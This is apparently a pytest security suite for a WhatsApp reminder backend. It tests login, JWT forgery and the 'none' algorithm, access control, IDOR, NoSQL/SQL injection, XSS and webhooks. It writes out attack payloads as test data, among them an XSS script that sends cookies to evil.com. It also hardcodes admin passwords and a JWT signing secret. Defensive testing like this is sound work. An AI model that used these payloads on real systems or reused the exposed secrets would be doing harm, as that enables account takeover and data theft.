"""
Comprehensive Security and Functionality Tests
Tests for authentication, authorization, injection attacks, IDOR, XSS, and more
"""
import pytest
import requests
import os
import json
import base64
from datetime import datetime, timedelta
import jwt

BASE_URL = os.environ.get('REACT_APP_BACKEND_URL', 'https://whatsapp-automation-22.preview.emergentagent.com').rstrip('/')

# Test credentials
ADMIN_EMAIL = "bizchatapi@gmail.com"
ADMIN_PASSWORD = "adminpassword"
USER_EMAIL = "rapidexpresstechnologies@gmail.com"
USER_PASSWORD = "test123"

# JWT Secret (known from .env for testing)
JWT_SECRET = "v0fnpE3rMslKiuoSzOQSDxEwSqUv9XkNGTSnC8CSoCI"


class TestAuthentication:
    """Authentication endpoint tests"""
    
    def test_login_admin_success(self):
        """Test admin login with correct credentials"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        assert response.status_code == 200, f"Login failed: {response.text}"
        data = response.json()
        assert "token" in data
        assert data["user"]["role"] == "admin"
        print(f"✓ Admin login successful")
    
    def test_login_user_success(self):
        """Test regular user login"""
        # First try to create the user if it doesn't exist
        admin_token = self._get_admin_token()
        
        # Try to login
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": USER_EMAIL,
            "password": USER_PASSWORD
        })
        
        if response.status_code == 401:
            # User doesn't exist, try to create
            create_response = requests.post(
                f"{BASE_URL}/api/auth/register",
                json={
                    "email": USER_EMAIL,
                    "password": USER_PASSWORD,
                    "firstName": "Test",
                    "lastName": "User",
                    "role": "user"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            if create_response.status_code == 200:
                # Try login again
                response = requests.post(f"{BASE_URL}/api/auth/login", json={
                    "email": USER_EMAIL,
                    "password": USER_PASSWORD
                })
        
        if response.status_code == 200:
            data = response.json()
            assert "token" in data
            assert data["user"]["role"] == "user"
            print(f"✓ User login successful")
        else:
            print(f"⚠ User login failed (user may not exist): {response.status_code}")
    
    def test_login_invalid_credentials(self):
        """Test login with wrong credentials"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": "wrong@example.com",
            "password": "wrongpassword"
        })
        assert response.status_code == 401
        print("✓ Invalid credentials correctly rejected")
    
    def test_login_empty_password(self):
        """Test login with empty password"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ""
        })
        assert response.status_code in [401, 422], f"Expected 401/422, got {response.status_code}"
        print("✓ Empty password correctly rejected")
    
    def test_login_sql_injection_email(self):
        """Test SQL injection in email field"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": "' OR '1'='1",
            "password": "test"
        })
        assert response.status_code in [401, 422], "SQL injection should not succeed"
        print("✓ SQL injection in email rejected")
    
    def test_login_nosql_injection_email(self):
        """Test NoSQL injection in email field"""
        # MongoDB operator injection
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": {"$ne": None},
            "password": ADMIN_PASSWORD
        })
        assert response.status_code == 422, f"NoSQL injection should be rejected, got {response.status_code}"
        print("✓ NoSQL injection in email rejected")
    
    def test_login_nosql_injection_password(self):
        """Test NoSQL injection in password field"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": {"$ne": None}
        })
        assert response.status_code == 422, f"NoSQL injection should be rejected, got {response.status_code}"
        print("✓ NoSQL injection in password rejected")
    
    def _get_admin_token(self):
        """Helper to get admin token"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return response.json()["token"]
        return None


class TestJWTSecurity:
    """JWT token security tests"""
    
    @pytest.fixture(scope="class")
    def valid_admin_token(self):
        """Get valid admin token"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return response.json()["token"]
        pytest.skip("Could not get admin token")
    
    def test_access_without_token(self):
        """Test accessing protected endpoint without token"""
        response = requests.get(f"{BASE_URL}/api/auth/me")
        assert response.status_code in [401, 403], f"Expected 401/403, got {response.status_code}"
        print("✓ Protected endpoint requires authentication")
    
    def test_access_with_invalid_token(self):
        """Test accessing with invalid token"""
        response = requests.get(
            f"{BASE_URL}/api/auth/me",
            headers={"Authorization": "Bearer invalid_token_12345"}
        )
        assert response.status_code == 401
        print("✓ Invalid token rejected")
    
    def test_access_with_expired_token(self):
        """Test accessing with expired token"""
        # Create an expired token
        expired_payload = {
            "userId": "test-id",
            "email": ADMIN_EMAIL,
            "role": "admin",
            "exp": datetime.utcnow() - timedelta(hours=25)  # Expired 25 hours ago
        }
        expired_token = jwt.encode(expired_payload, JWT_SECRET, algorithm='HS256')
        
        response = requests.get(
            f"{BASE_URL}/api/auth/me",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        assert response.status_code == 401
        print("✓ Expired token rejected")
    
    def test_access_with_tampered_token(self):
        """Test accessing with tampered JWT payload"""
        # Create token with wrong secret
        tampered_payload = {
            "userId": "admin-id",
            "email": ADMIN_EMAIL,
            "role": "admin",
            "exp": datetime.utcnow() + timedelta(hours=24)
        }
        tampered_token = jwt.encode(tampered_payload, "wrong-secret-key", algorithm='HS256')
        
        response = requests.get(
            f"{BASE_URL}/api/auth/me",
            headers={"Authorization": f"Bearer {tampered_token}"}
        )
        assert response.status_code == 401
        print("✓ Tampered token rejected")
    
    def test_access_with_forged_admin_role(self):
        """Test forging admin role in token"""
        # Create token with forged admin role using wrong secret
        forged_payload = {
            "userId": "forged-user-id",
            "email": "hacker@example.com",
            "role": "admin",
            "exp": datetime.utcnow() + timedelta(hours=24)
        }
        forged_token = jwt.encode(forged_payload, "guessed-secret", algorithm='HS256')
        
        response = requests.get(
            f"{BASE_URL}/api/users",
            headers={"Authorization": f"Bearer {forged_token}"}
        )
        assert response.status_code == 401, "Forged token should be rejected"
        print("✓ Forged admin token rejected")
    
    def test_none_algorithm_attack(self):
        """Test JWT none algorithm attack"""
        # Create unsigned token (none algorithm attack)
        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "userId": "admin-id",
            "email": ADMIN_EMAIL,
            "role": "admin",
            "exp": datetime.utcnow() + timedelta(hours=24)
        }
        
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, default=str).encode()).rstrip(b'=').decode()
        unsigned_token = f"{header_b64}.{payload_b64}."
        
        response = requests.get(
            f"{BASE_URL}/api/auth/me",
            headers={"Authorization": f"Bearer {unsigned_token}"}
        )
        assert response.status_code == 401, "None algorithm attack should fail"
        print("✓ None algorithm attack prevented")


class TestAuthorization:
    """Role-based access control tests"""
    
    @pytest.fixture(scope="class")
    def admin_headers(self):
        """Get admin auth headers"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return {"Authorization": f"Bearer {response.json()['token']}"}
        pytest.skip("Admin login failed")
    
    @pytest.fixture(scope="class")
    def user_headers(self):
        """Get regular user auth headers"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": USER_EMAIL,
            "password": USER_PASSWORD
        })
        if response.status_code == 200:
            return {"Authorization": f"Bearer {response.json()['token']}"}
        # Try to create user if doesn't exist
        admin_response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if admin_response.status_code == 200:
            admin_token = admin_response.json()["token"]
            create_response = requests.post(
                f"{BASE_URL}/api/auth/register",
                json={
                    "email": USER_EMAIL,
                    "password": USER_PASSWORD,
                    "firstName": "Test",
                    "lastName": "User",
                    "role": "user"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            if create_response.status_code == 200:
                login_response = requests.post(f"{BASE_URL}/api/auth/login", json={
                    "email": USER_EMAIL,
                    "password": USER_PASSWORD
                })
                if login_response.status_code == 200:
                    return {"Authorization": f"Bearer {login_response.json()['token']}"}
        pytest.skip("User login/creation failed")
    
    def test_user_cannot_access_admin_users_list(self, user_headers):
        """Test regular user cannot access admin users list"""
        response = requests.get(f"{BASE_URL}/api/users", headers=user_headers)
        assert response.status_code == 403, f"Expected 403, got {response.status_code}"
        print("✓ User cannot access admin users list")
    
    def test_user_cannot_register_new_users(self, user_headers):
        """Test regular user cannot register new users (admin only)"""
        response = requests.post(
            f"{BASE_URL}/api/auth/register",
            json={
                "email": "newuser@test.com",
                "password": "test123",
                "firstName": "New",
                "lastName": "User"
            },
            headers=user_headers
        )
        assert response.status_code == 403, f"Expected 403, got {response.status_code}"
        print("✓ User cannot register new users")
    
    def test_user_cannot_pause_other_users(self, user_headers, admin_headers):
        """Test regular user cannot pause other users"""
        # Get admin user ID
        me_response = requests.get(f"{BASE_URL}/api/auth/me", headers=admin_headers)
        if me_response.status_code != 200:
            pytest.skip("Could not get admin info")
        admin_id = me_response.json()["id"]
        
        response = requests.put(
            f"{BASE_URL}/api/users/{admin_id}/pause",
            json={"isPaused": True},
            headers=user_headers
        )
        assert response.status_code == 403, f"Expected 403, got {response.status_code}"
        print("✓ User cannot pause other users")
    
    def test_admin_can_access_users_list(self, admin_headers):
        """Test admin can access users list"""
        response = requests.get(f"{BASE_URL}/api/users", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        assert "users" in data
        print(f"✓ Admin can access users list ({len(data['users'])} users)")
    
    def test_admin_can_see_all_reminders(self, admin_headers):
        """Test admin can see all reminders (not just their own)"""
        response = requests.get(f"{BASE_URL}/api/reminders", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        assert "reminders" in data
        print(f"✓ Admin can see all reminders")


class TestIDOR:
    """Insecure Direct Object Reference tests"""
    
    @pytest.fixture(scope="class")
    def admin_headers(self):
        """Get admin auth headers"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return {"Authorization": f"Bearer {response.json()['token']}"}
        pytest.skip("Admin login failed")
    
    @pytest.fixture(scope="class")
    def user_headers_and_id(self):
        """Get regular user auth headers and user ID"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": USER_EMAIL,
            "password": USER_PASSWORD
        })
        if response.status_code == 200:
            token = response.json()["token"]
            headers = {"Authorization": f"Bearer {token}"}
            me_response = requests.get(f"{BASE_URL}/api/auth/me", headers=headers)
            if me_response.status_code == 200:
                return headers, me_response.json()["id"]
        pytest.skip("User login failed")
    
    def test_user_cannot_view_other_user_profile(self, user_headers_and_id, admin_headers):
        """Test user cannot view another user's profile details"""
        user_headers, _ = user_headers_and_id
        
        # Get admin user ID
        me_response = requests.get(f"{BASE_URL}/api/auth/me", headers=admin_headers)
        if me_response.status_code != 200:
            pytest.skip("Could not get admin info")
        admin_id = me_response.json()["id"]
        
        # Try to access admin's profile as regular user
        response = requests.get(f"{BASE_URL}/api/users/{admin_id}", headers=user_headers)
        assert response.status_code == 403, f"Expected 403 for IDOR, got {response.status_code}"
        print("✓ User cannot view other user's profile (IDOR protected)")
    
    def test_user_cannot_modify_other_user_profile(self, user_headers_and_id, admin_headers):
        """Test user cannot modify another user's profile"""
        user_headers, _ = user_headers_and_id
        
        # Get admin user ID
        me_response = requests.get(f"{BASE_URL}/api/auth/me", headers=admin_headers)
        if me_response.status_code != 200:
            pytest.skip("Could not get admin info")
        admin_id = me_response.json()["id"]
        
        # Try to update admin's profile as regular user
        response = requests.put(
            f"{BASE_URL}/api/users/{admin_id}",
            json={"firstName": "Hacked"},
            headers=user_headers
        )
        assert response.status_code == 403, f"Expected 403 for IDOR, got {response.status_code}"
        print("✓ User cannot modify other user's profile (IDOR protected)")
    
    def test_user_cannot_delete_other_user_reminder_number(self, user_headers_and_id, admin_headers):
        """Test user cannot delete another user's reminder number"""
        user_headers, user_id = user_headers_and_id
        
        # Create a reminder number as admin
        admin_create_response = requests.post(
            f"{BASE_URL}/api/reminder-numbers",
            json={
                "phone": "+91TESTIDOR123",
                "name": "TEST_IDOR Number",
                "timezone": "Asia/Kolkata"
            },
            headers=admin_headers
        )
        
        if admin_create_response.status_code == 200:
            number_id = admin_create_response.json()["numberId"]
            
            # Try to delete admin's number as regular user
            delete_response = requests.delete(
                f"{BASE_URL}/api/reminder-numbers/{number_id}",
                headers=user_headers
            )
            assert delete_response.status_code == 404, f"Expected 404 for IDOR, got {delete_response.status_code}"
            print("✓ User cannot delete other user's reminder number (IDOR protected)")
            
            # Cleanup - delete as admin
            requests.delete(f"{BASE_URL}/api/reminder-numbers/{number_id}", headers=admin_headers)
        else:
            print("⚠ Could not create test number (may already exist)")
    
    def test_user_cannot_access_other_user_reminder(self, user_headers_and_id, admin_headers):
        """Test user cannot access another user's reminder"""
        user_headers, user_id = user_headers_and_id
        
        # Get admin's user ID
        admin_me_response = requests.get(f"{BASE_URL}/api/auth/me", headers=admin_headers)
        if admin_me_response.status_code != 200:
            pytest.skip("Could not get admin info")
        admin_id = admin_me_response.json()["id"]
        
        # Get all reminders as admin (admin can see all)
        admin_reminders_response = requests.get(f"{BASE_URL}/api/reminders", headers=admin_headers)
        if admin_reminders_response.status_code == 200:
            reminders = admin_reminders_response.json().get("reminders", [])
            # Find a reminder that belongs to admin (not the test user)
            admin_reminder = None
            for r in reminders:
                if r.get("userId") == admin_id:
                    admin_reminder = r
                    break
            
            if admin_reminder:
                admin_reminder_id = admin_reminder["id"]
                
                # Try to access admin's reminder as regular user
                response = requests.get(
                    f"{BASE_URL}/api/reminders/{admin_reminder_id}",
                    headers=user_headers
                )
                # Should return 404 (not found for this user)
                assert response.status_code == 404, f"Expected 404 for IDOR, got {response.status_code}"
                print("✓ User cannot access other user's reminder (IDOR protected)")
            else:
                print("⚠ No admin-owned reminders to test IDOR (admin has no reminders)")
        else:
            print("⚠ Could not get reminders")


class TestNoSQLInjection:
    """NoSQL injection vulnerability tests"""
    
    @pytest.fixture(scope="class")
    def admin_headers(self):
        """Get admin auth headers"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return {"Authorization": f"Bearer {response.json()['token']}"}
        pytest.skip("Admin login failed")
    
    def test_nosql_injection_in_reminder_number_phone(self, admin_headers):
        """Test NoSQL injection in phone number field"""
        response = requests.post(
            f"{BASE_URL}/api/reminder-numbers",
            json={
                "phone": {"$gt": ""},
                "name": "Test",
                "timezone": "Asia/Kolkata"
            },
            headers=admin_headers
        )
        assert response.status_code == 422, f"NoSQL injection should be rejected, got {response.status_code}"
        print("✓ NoSQL injection in phone field rejected")
    
    def test_nosql_injection_in_reminder_title(self, admin_headers):
        """Test NoSQL injection in reminder title"""
        # Get a number ID first
        numbers_response = requests.get(f"{BASE_URL}/api/reminder-numbers", headers=admin_headers)
        if numbers_response.status_code != 200 or not numbers_response.json().get("numbers"):
            pytest.skip("No numbers available for test")
        
        number_id = numbers_response.json()["numbers"][0]["id"]
        scheduled_time = (datetime.utcnow() + timedelta(hours=1)).isoformat() + "Z"
        
        response = requests.post(
            f"{BASE_URL}/api/reminders/direct",
            json={
                "numberId": number_id,
                "title": {"$ne": None},
                "message": "Test",
                "scheduledAt": scheduled_time
            },
            headers=admin_headers
        )
        assert response.status_code == 422, f"NoSQL injection should be rejected, got {response.status_code}"
        print("✓ NoSQL injection in title field rejected")
    
    def test_nosql_injection_in_template_name(self, admin_headers):
        """Test NoSQL injection in template name"""
        response = requests.post(
            f"{BASE_URL}/api/saved-templates",
            json={
                "name": {"$ne": None},
                "templateName": "test_template",
                "templateLanguage": "en"
            },
            headers=admin_headers
        )
        assert response.status_code == 422, f"NoSQL injection should be rejected, got {response.status_code}"
        print("✓ NoSQL injection in template name rejected")
    
    def test_nosql_regex_injection(self, admin_headers):
        """Test NoSQL regex injection"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": {"$regex": ".*"},
            "password": {"$regex": ".*"}
        })
        assert response.status_code == 422, f"Regex injection should be rejected, got {response.status_code}"
        print("✓ NoSQL regex injection rejected")


class TestXSS:
    """XSS vulnerability tests"""
    
    @pytest.fixture(scope="class")
    def admin_headers(self):
        """Get admin auth headers"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return {"Authorization": f"Bearer {response.json()['token']}"}
        pytest.skip("Admin login failed")
    
    def test_xss_in_reminder_number_name(self, admin_headers):
        """Test XSS in reminder number name (should be stored safely)"""
        xss_payload = "<script>alert('XSS')</script>"
        response = requests.post(
            f"{BASE_URL}/api/reminder-numbers",
            json={
                "phone": f"+91TEST{datetime.now().strftime('%H%M%S')}XSS",
                "name": xss_payload,
                "timezone": "Asia/Kolkata"
            },
            headers=admin_headers
        )
        # Should either reject or safely store
        if response.status_code == 200:
            number_id = response.json()["numberId"]
            # Check if XSS is stored (backend doesn't need to sanitize - that's frontend's job)
            # But we should verify it doesn't cause errors
            get_response = requests.get(f"{BASE_URL}/api/reminder-numbers/{number_id}", headers=admin_headers)
            assert get_response.status_code == 200
            # Cleanup
            requests.delete(f"{BASE_URL}/api/reminder-numbers/{number_id}", headers=admin_headers)
            print("✓ XSS payload stored safely (no backend error)")
        else:
            print("✓ XSS payload rejected by backend")
    
    def test_xss_in_reminder_message(self, admin_headers):
        """Test XSS in reminder message"""
        # Get a number ID first
        numbers_response = requests.get(f"{BASE_URL}/api/reminder-numbers", headers=admin_headers)
        if numbers_response.status_code != 200 or not numbers_response.json().get("numbers"):
            pytest.skip("No numbers available for test")
        
        number_id = numbers_response.json()["numbers"][0]["id"]
        scheduled_time = (datetime.utcnow() + timedelta(hours=1)).isoformat() + "Z"
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
        ]
        
        for xss in xss_payloads:
            response = requests.post(
                f"{BASE_URL}/api/reminders/direct",
                json={
                    "numberId": number_id,
                    "title": f"XSS Test {datetime.now().strftime('%H%M%S')}",
                    "message": xss,
                    "scheduledAt": scheduled_time
                },
                headers=admin_headers
            )
            # Backend should accept but XSS should be handled on frontend
            if response.status_code == 200:
                reminder_id = response.json()["reminderId"]
                # Cleanup
                requests.delete(f"{BASE_URL}/api/reminders/{reminder_id}", headers=admin_headers)
        
        print("✓ XSS payloads in reminder message handled")
    
    def test_xss_in_template_fields(self, admin_headers):
        """Test XSS in saved template fields"""
        xss_payload = "<script>document.location='http://evil.com/?c='+document.cookie</script>"
        
        response = requests.post(
            f"{BASE_URL}/api/saved-templates",
            json={
                "name": f"XSS_Test_{datetime.now().strftime('%H%M%S')}",
                "templateName": "test",
                "templateLanguage": "en",
                "field1": xss_payload
            },
            headers=admin_headers
        )
        
        if response.status_code == 200:
            template_id = response.json()["templateId"]
            # Cleanup
            requests.delete(f"{BASE_URL}/api/saved-templates/{template_id}", headers=admin_headers)
            print("✓ XSS payload in template field stored safely")
        else:
            print("✓ XSS payload in template field rejected")


class TestProtectedEndpoints:
    """Test that all protected endpoints require authentication"""
    
    def test_users_endpoint_requires_auth(self):
        """Test /api/users requires authentication"""
        response = requests.get(f"{BASE_URL}/api/users")
        assert response.status_code in [401, 403]
        print("✓ /api/users requires auth")
    
    def test_reminders_endpoint_requires_auth(self):
        """Test /api/reminders requires authentication"""
        response = requests.get(f"{BASE_URL}/api/reminders")
        assert response.status_code in [401, 403]
        print("✓ /api/reminders requires auth")
    
    def test_reminder_numbers_endpoint_requires_auth(self):
        """Test /api/reminder-numbers requires authentication"""
        response = requests.get(f"{BASE_URL}/api/reminder-numbers")
        assert response.status_code in [401, 403]
        print("✓ /api/reminder-numbers requires auth")
    
    def test_reminder_settings_endpoint_requires_auth(self):
        """Test /api/reminders/settings requires authentication"""
        response = requests.get(f"{BASE_URL}/api/reminders/settings")
        assert response.status_code in [401, 403]
        print("✓ /api/reminders/settings requires auth")
    
    def test_saved_templates_endpoint_requires_auth(self):
        """Test /api/saved-templates requires authentication"""
        response = requests.get(f"{BASE_URL}/api/saved-templates")
        assert response.status_code in [401, 403]
        print("✓ /api/saved-templates requires auth")
    
    def test_campaigns_endpoint_requires_auth(self):
        """Test /api/campaigns requires authentication"""
        response = requests.get(f"{BASE_URL}/api/campaigns")
        assert response.status_code in [401, 403]
        print("✓ /api/campaigns requires auth")
    
    def test_me_endpoint_requires_auth(self):
        """Test /api/auth/me requires authentication"""
        response = requests.get(f"{BASE_URL}/api/auth/me")
        assert response.status_code in [401, 403]
        print("✓ /api/auth/me requires auth")
    
    def test_change_password_requires_auth(self):
        """Test /api/auth/change-password requires authentication"""
        response = requests.post(f"{BASE_URL}/api/auth/change-password", json={
            "currentPassword": "test",
            "newPassword": "test123"
        })
        assert response.status_code in [401, 403]
        print("✓ /api/auth/change-password requires auth")
    
    def test_register_requires_admin(self):
        """Test /api/auth/register requires admin authentication"""
        response = requests.post(f"{BASE_URL}/api/auth/register", json={
            "email": "newuser@test.com",
            "password": "test123",
            "firstName": "New",
            "lastName": "User"
        })
        assert response.status_code in [401, 403]
        print("✓ /api/auth/register requires admin auth")


class TestCORSConfiguration:
    """CORS configuration tests"""
    
    def test_cors_headers_present(self):
        """Test that CORS headers are present"""
        response = requests.options(
            f"{BASE_URL}/api/health",
            headers={"Origin": "https://example.com"}
        )
        # CORS preflight should be handled
        assert response.status_code in [200, 204, 405]
        print("✓ CORS preflight handled")
    
    def test_cors_allows_credentials(self):
        """Test CORS configuration allows credentials"""
        response = requests.get(
            f"{BASE_URL}/api/health",
            headers={"Origin": "https://example.com"}
        )
        # Check if Access-Control headers are present
        cors_header = response.headers.get("Access-Control-Allow-Origin", "")
        # Either * or specific origin
        print(f"✓ CORS origin header: {cors_header or 'default'}")


class TestSensitiveDataExposure:
    """Test for sensitive data exposure in API responses"""
    
    @pytest.fixture(scope="class")
    def admin_headers(self):
        """Get admin auth headers"""
        response = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD
        })
        if response.status_code == 200:
            return {"Authorization": f"Bearer {response.json()['token']}"}
        pytest.skip("Admin login failed")
    
    def test_password_not_in_user_response(self, admin_headers):
        """Test that password is not exposed in user responses"""
        response = requests.get(f"{BASE_URL}/api/auth/me", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        assert "password" not in data, "Password should not be in response"
        print("✓ Password not exposed in /auth/me")
    
    def test_password_not_in_users_list(self, admin_headers):
        """Test that passwords are not exposed in users list"""
        response = requests.get(f"{BASE_URL}/api/users", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        for user in data.get("users", []):
            assert "password" not in user, f"Password exposed for user {user.get('email')}"
        print("✓ Passwords not exposed in users list")
    
    def test_mongodb_id_not_exposed(self, admin_headers):
        """Test that MongoDB _id is not exposed"""
        response = requests.get(f"{BASE_URL}/api/auth/me", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        assert "_id" not in data, "MongoDB _id should not be in response"
        print("✓ MongoDB _id not exposed")
    
    def test_api_key_masked_in_settings(self, admin_headers):
        """Test that API key is masked in settings response"""
        response = requests.get(f"{BASE_URL}/api/reminders/settings", headers=admin_headers)
        assert response.status_code == 200
        data = response.json()
        
        if data.get("openaiApiKey"):
            # Should be masked, not the actual key
            assert not data["openaiApiKey"].startswith("sk-") or data["openaiApiKey"] == "sk-...configured"
            print("✓ OpenAI API key is masked in settings")
        else:
            print("✓ No API key configured (nothing to expose)")


class TestWebhookSecurity:
    """Webhook endpoint security tests"""
    
    def test_webhook_accepts_valid_payload(self):
        """Test webhook accepts valid payload"""
        response = requests.post(
            f"{BASE_URL}/api/webhook/bizchat",
            json={
                "contact": {"phone_number": "919876543210"},
                "message": {"body": "help", "is_new_message": True}
            }
        )
        # Webhook might ignore if phone not registered, but shouldn't crash
        assert response.status_code in [200, 400, 404]
        print(f"✓ Webhook handles valid payload (status: {response.status_code})")
    
    def test_webhook_handles_missing_fields(self):
        """Test webhook handles missing fields gracefully"""
        response = requests.post(
            f"{BASE_URL}/api/webhook/bizchat",
            json={}
        )
        # Should not crash, may return ignored status
        assert response.status_code in [200, 400, 422]
        print(f"✓ Webhook handles empty payload (status: {response.status_code})")
    
    def test_webhook_verify_endpoint(self):
        """Test webhook GET verification endpoint"""
        response = requests.get(f"{BASE_URL}/api/webhook/bizchat")
        assert response.status_code == 200
        print("✓ Webhook verification endpoint works")
    
    def test_webhook_challenge_response(self):
        """Test webhook challenge response"""
        response = requests.get(f"{BASE_URL}/api/webhook/bizchat?challenge=test123")
        assert response.status_code == 200
        data = response.json()
        assert data.get("challenge") == "test123"
        print("✓ Webhook challenge response works")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
